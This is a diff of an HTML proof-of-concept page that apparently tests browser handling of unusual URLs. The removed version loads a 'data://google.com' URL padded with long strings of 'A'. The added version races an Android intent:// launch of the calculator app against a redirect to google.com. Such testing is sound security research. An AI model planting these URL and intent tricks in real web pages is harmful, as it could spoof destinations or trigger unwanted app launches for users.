@@ -1,19 +1,28 @@
+
+
 <!DOCTYPE html>
-<html>
-<body style="text-align:center;margin-top:60px">
+<html lang="en"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <meta http-equiv="X-UA-Compatible" content="ie=edge"> <title>My Cool App</title> </head> <body> <div id="redirect-div" onclick="navigate()"> <h1>Opening My Cool App...</h1> </div>
+<div style="margin-top:100px">
+<button onclick="p()">go to google</button>
+</div>
+</body> 
+<script type="text/javascript"> 
+function navigate() { 
+url="intent://com.sec.android.app.popupcalculator#Intent;scheme=android-app;end"; window.location = url;
+setTimeout('window.location = url',1300); 
 
-<button onclick="go()" style="font-size:18px;padding:14px 28px">
-  Download
-</button>
-
-<script>
-function go() {
-  location.href =
-    "data://google.com/text/plain," +
-    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
-    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
+} 
+var w=0;
+function p(){
+  
+ 
+  
+   setTimeout('navigate()',1);
+  
+ setTimeout("window.location.replace('http://google.com')",1)
+ 
 }
-</script>
 
-</body>
-</html>
+
+
+</script> </html>
